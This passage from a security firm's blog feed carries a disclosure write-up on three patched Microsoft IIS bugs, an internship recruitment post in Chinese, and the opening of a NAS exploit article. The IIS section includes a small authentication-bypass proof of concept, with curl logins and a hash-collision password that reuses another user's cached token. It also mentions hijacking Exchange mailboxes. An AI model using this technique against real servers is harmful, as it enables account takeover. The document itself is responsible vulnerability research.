&lt;p&gt;Because most of the details are in the slides, please forgive me this time for this brief write-ups instead of a full blog.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22025&quot;&gt;CVE-2022-22025&lt;/a&gt; - Microsoft IIS Hash-Flooding DoS&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22040&quot;&gt;CVE-2022-22040&lt;/a&gt; - Microsoft IIS Cache Poisoning Attack&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30209&quot;&gt;CVE-2022-30209&lt;/a&gt; - Microsoft IIS Authentication Bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. All vulnerabilities addressed in this blog have been reported responsibly to Microsoft and patched in July 2022.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-iis-hash-flooding-dos&quot;&gt;1. IIS Hash-Flooding DoS&lt;/h2&gt;

&lt;p&gt;It’s hard to imagine that we can still see such a classic Algorithmic Complexity Attack as Hash-Flooding Attack in IIS in 2022. Although Microsoft has configured a thread deleting outdated records every 30 seconds to mitigate the attack, we still found a key-splitting bug in the implementation to &lt;strong&gt;amplify our power by over 10 times to defeat the guardian by zero hashes&lt;/strong&gt;. Through this bug we can &lt;strong&gt;make a default installed IIS Server unresponsive&lt;/strong&gt; with about 30 connections per second!&lt;/p&gt;

&lt;p&gt;Because this bug also qualifies for the &lt;a href=&quot;https://www.microsoft.com/en-us/msrc/bounty-windows-insider-preview&quot;&gt;Windows Insider Preview Bounty Program&lt;/a&gt;, we also rewarded $30,000 for this DoS. This is the maximum bounty for the category of Denial-of-Service!&lt;/p&gt;

&lt;p&gt;You can check the full demo video here:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VtnDkzYPNCk&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;2-iis-cache-poisoning-attack&quot;&gt;2. IIS Cache Poisoning Attack&lt;/h2&gt;

&lt;p&gt;Compared with other &lt;a href=&quot;https://portswigger.net/research/practical-web-cache-poisoning&quot;&gt;marvelous Cache Poisoning research&lt;/a&gt;, this one is relatively plain. The bug is found in the component of Output Caching, the module responsible for caching dynamic responses to reduce expensive database or filesystem access on web stacks.&lt;/p&gt;

&lt;p&gt;Output Caching uses a bad Query String parser that only takes the first occurrence as the Cache-Key when Query String keys are duplicated. This behavior is actually not a problem independently. However, it’s a trouble in the view of the whole architecture with the backend, ASP.NET. The backend concatenates the value of all repeated keys together, which leads to an inconsistency between parser behaviors. Therefore, &lt;strong&gt;a classic HTTP Parameter Pollution can make IIS cache the wrong result&lt;/strong&gt;!&lt;/p&gt;

&lt;h2 id=&quot;3-iis-authentication-bypass&quot;&gt;3. IIS Authentication Bypass&lt;/h2&gt;

&lt;p&gt;This may be the most interesting bug of this talk. LKRHash is a Hash Table algorithm designed and &lt;a href=&quot;https://patents.google.com/patent/US6578131&quot;&gt;patented&lt;/a&gt; by Microsoft in 1997. It’s based on &lt;a href=&quot;https://en.wikipedia.org/wiki/Linear_hashing&quot;&gt;Linear Hashing&lt;/a&gt; and created by &lt;a href=&quot;https://en.wikipedia.org/wiki/Paul_Larson&quot;&gt;Paul Larson&lt;/a&gt; of Microsoft Research, Murali Krishnan and George Reilly of the IIS team.&lt;/p&gt;

&lt;p&gt;LKRHash aims to build a scalable and high-concurrent Hash Table under the multithreading and multi-core environment. The creators put a lot of effort into making this implementation portable, flexible and customizable to adapt to multiple products across Microsoft. An application can define its own Table-Related functions, such as the Hash Function, the Key Extracting Function, or the Key Comparing Function. This kind of extensibility creates a bunch of opportunities for vulnerability mining. So, under this context, we cares more about the relationship between the records, the keys, and the functions.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;TOKEN_CACHE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// An identifier for debugging&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnExtractKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Extract key from record&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnCalcKeyHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Calculate hash signature of key&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnEqualKeys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// Compare two keys&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnAddRefRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// AddRef in FindKey, etc&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// Bound on the average chain length.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Initial size of hash table.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Number of subordinate hash tables.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// Allow multiple identical keys?&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Because “Logon” is an expensive operation, to improve the performance, IIS cached all tokens for password-based authentications, such as Basic Authentication by default, and the bug we found this time is located in the logic of the key-comparing function when a collision occurs.&lt;/p&gt;

&lt;p&gt;If a login attempt whose hash hits a key that is already in the cache, LKRHash enters the application-specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfnEqualKeys&lt;/code&gt; function to determine whether the key is correct or not. The application-specific logic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TokenCacheModule&lt;/code&gt; is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As the logic compares several parts to make the decision, it’s weird why IIS compares the username twice.&lt;/p&gt;

&lt;p&gt;I guess the original intent was to compare the password. However, the developer copy-and-pasted the code but forgot to replace the variable name. That leads to that &lt;strong&gt;an attacker can reuse another user’s logged-in token with random passwords&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To build the smallest PoC to test your own, you can create a testing account and configure the Basic Authentication on your IIS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# add a test account, please ensure to remove that after testing&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; net user orange test-for-CVE-2022-30209-auth-bypass /add

&lt;span class=&quot;c&quot;&gt;# the source of login is not important, this can be done outside IIS.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under the attacker’s terminal:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# script for sanity check&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;test.py
def HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
    j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;c &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;map&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord, password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; c + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;101&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;amp;0xffffffff
    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;j

assert HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ZeeiJT&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# before the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 401 Unauthorized

&lt;span class=&quot;c&quot;&gt;# after the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the attacker can log into the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;orange&lt;/code&gt; with another password whose hash is the same as the original one.&lt;/p&gt;

&lt;p&gt;However, it’s not easy to collide the hash. The probability of each attempt is only worth 1/2^32 because the hash is a 32-Bit Integer, and the attacker has no way to know the hash of existing cache keys. It’s a ridiculous number to make exploiting this bug like playing a lottery. The only pro is that the attempt costs nothing, and you have unlimited tries!&lt;/p&gt;

&lt;p&gt;To make this bug more practical, we proposed several ways to win the lottery, such as:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Increase the odds of the collision - LKRHash combined LCGs to scramble the result to make the hash more random. However, we can lower the key space because the LCG is not one-to-one mapping under the 32-Bit Integer. There must be results that will never appear so that we can pre-compute a dictionary that excludes the password whose hash is not in the results and &lt;strong&gt;increase the success rate by 13% at least&lt;/strong&gt;!&lt;/li&gt;
  &lt;li&gt;Regain the initiative - By understanding the root cause, we brainstorm several use cases that &lt;strong&gt;can cache the token in memory forever and no longer wait for user interaction&lt;/strong&gt;, such as the IIS feature &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/iis/www-authentication-authorization/understanding-identities&quot;&gt;Connect As&lt;/a&gt; or leveraging software design patterns.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We have also proved this attack works naturally on Microsoft Exchange Server. By leveraging the default activated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Active Monitoring&lt;/code&gt; service, we can enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HealthMailbox&lt;/code&gt;’s mailbox without passwords! This authentication-less account hijacking is useful for further exploitations such as phishing or chaining another post-auth RCE together!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Mar 16, 2022 - We reported the IIS Cache Poisoning to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 09, 2022 - We reported the IIS Hash-Flooding DoS to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 10, 2022 - We reported the IIS Authentication Bypass to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Jul 12, 2022 - Microsoft fixed everything at July’s Patch Tuesday.&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis/</link>
                <guid>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis</guid>
                <pubDate>Thu, 18 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 第二屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 自 2012 成立以來已邁向第十年，我們很重視台灣的資安，也專注找出最嚴重的弱點以保護世界。雖然公司規模擴張不快，但在漸漸站穩腳步的同時，我們仍不忘初衷：從 2020 開始在輔大、台科大成立資安獎學金；在 2021 年末擴大&lt;a href=&quot;https://devco.re/company/jobs/&quot;&gt;徵才&lt;/a&gt;，想找尋有著相同理念的人才一起奮鬥；今年年初，我們開始嘗試舉辦第一屆實習生計畫，希望培育人才、增強新世代的資安技能，最終成果也超乎預期。於是我們決定在今年 9 月進行第二屆實習生計畫，如果您對這個計畫有興趣，歡迎來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Binary 及 Web 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試寫過往漏洞的 Exploit 理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 70 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
主要內容為在導師指引與輔佐下研究過往漏洞與近年常見新型態漏洞、攻擊手法，需要製作投影片介紹成果並建置可供他人重現弱點的模擬測試環境 (Lab)，另可能需要撰寫或修改可利用攻擊程式進行弱點驗證。
    &lt;ul&gt;
      &lt;li&gt;漏洞及攻擊手法研究 70%&lt;/li&gt;
      &lt;li&gt;建置 Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2022 年 9 月開始到 2023 年 2 月底，共 6 個月。
    &lt;ul&gt;
      &lt;li&gt;備註：若應徵人數過多，我們評估無法在 08/26 前決定人選。整體實習時間將會順延一至兩週，屆時會提早發信通知所有應徵者。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度&lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;p&gt;大專院校大三（含）以上具有一定程度資安背景的學生&lt;/p&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Web 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本逆向工程及除錯能力
    &lt;ul&gt;
      &lt;li&gt;能看懂組合語言並瞭解基本 Debugger 使用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本漏洞利用能力
    &lt;ul&gt;
      &lt;li&gt;須知道 Stack overflow、ROP 等相關利用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本 Scripting Language 開發能力
    &lt;ul&gt;
      &lt;li&gt;Python、Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備分析大型 Open Source 專案能力
    &lt;ul&gt;
      &lt;li&gt;以 C/C++ 為主&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備基礎作業系統知識
    &lt;ul&gt;
      &lt;li&gt;例如知道 Virtual Address 與 Physical Address 的概念&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;知道怎樣寫的程式碼會有問題
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;樂於分享技術
        &lt;ul&gt;
          &lt;li&gt;有公開的技術 blog/slide、Write-ups 或是演講&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;有寫過 1-day 利用程式&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;理解 PortSwigger Web Security Academy 中所有的安全議題或已完成所有 Lab。
    &lt;ul&gt;
      &lt;li&gt;參考連結：https://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作，包含 Unix-like 和 Windows 作業系統的常見或內建系統指令工具。&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式語言（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力。&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究。&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache）及作業系統（如：Linux）的能力。&lt;/li&gt;
  &lt;li&gt;具備追根究柢的精神。&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞。&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day exploit。&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目。&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為二個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;履歷資格審查&lt;/li&gt;
  &lt;li&gt;問答題答案（共 2 題，各組別題目不同，詳見下方&lt;a href=&quot;/blog/2022/07/25/2nd-internship-program-recruit/#:~:text=題目如下&quot;&gt;報名方式&lt;/a&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我們會根據您的履歷及所回答的內容來決定是否有通過第一階段，會在七個工作天內回覆。&lt;/p&gt;

&lt;h4 id=&quot;第二階段面試&quot;&gt;第二階段：面試&lt;/h4&gt;

&lt;p&gt;此階段為 1~2 小時的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;題目答案&lt;/strong&gt;以 PDF 格式寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 2022/08/12（五）23:59 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Web 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在三頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;對於這份實習的期望&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;題目如下，請依照欲申請之組別回答
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;簡答題
            &lt;ul&gt;
              &lt;li&gt;假設你今天要分析一台印表機
                &lt;ul&gt;
                  &lt;li&gt;你會如何去分析 ?&lt;/li&gt;
                  &lt;li&gt;你覺得有哪些地方可能會發生問題導致攻擊者可以獲得印表機控制權? 為什麼 ?&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;實作題目
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge.zip&quot;&gt;題目檔案&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;為一個互動式的 Server，可透過網路連線與之互動。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;請分析上述所提供的 Server，並利用其中的漏洞在 Windows 11 上跳出 calc.exe。
                &lt;ul&gt;
                  &lt;li&gt;漏洞可能有很多，不一定每個都可以利用。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;請務必寫下解題過程及如何去分析這個 Server，並交 write-up，請盡你所能來解題，即使最後沒有成功，也請寫下您所嘗試過的方法及思路，本測驗將會以 write-up 為主要依據。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;當你在網頁瀏覽器的網址列上輸入一串網址（例如：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;），隨後按下 Enter 鍵到出現網頁畫面為止，請問中間發生了什麼事情？請根據你所知的知識背景，以文字盡可能說明。&lt;/li&gt;
          &lt;li&gt;請提出三個，你印象最深刻或感到有趣、於西元 2020 ~ 2022 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解簡述說明各個漏洞的成因、利用條件和可以造成的影響，以及所對應到的 OWASP Top 10 / CWE 類別。&lt;/li&gt;
          &lt;li&gt;（上述題目建議撰寫 1~2 頁即可）&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2022/07/25/2nd-internship-program-recruit</guid>
                <pubDate>Mon, 25 Jul 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your NAS is not your NAS !</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2022/03/28/your-NAS-is-not-your-NAS/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;前年我們在 Synology 的 NAS 中發現了 &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-21-492/&quot;&gt;Pre-auth RCE 的漏洞(CVE-2021-31439)&lt;/a&gt;，並在 Pwn2Own Tokyo 中取得了 Synology DS418 play 的控制權，而成功獲得 Pwn2Own 的點數，後續也發現這個漏洞不只存在 Synology 的 NAS，也同時存在多數廠牌的 NAS 中，這篇研究將講述這漏洞的細節及我們的利用方式。&lt;/p&gt;

&lt;p&gt;此份研究亦發表於 &lt;a href=&quot;https://hitcon.org/2021/&quot;&gt;HITCON 2021&lt;/a&gt;，你可以從&lt;a href=&quot;https://hitcon.org/2021/agenda/03f06675-261d-4c97-b524-33ef9cc6ccb2/%E4%BD%A0%E7%9A%84%20NAS%20%E4%B8%8D%E6%98%AF%E4%BD%A0%E7%9A%84%20NAS%20!.pdf&quot;&gt;這裡&lt;/a&gt;取得投影片！&lt;/p&gt;

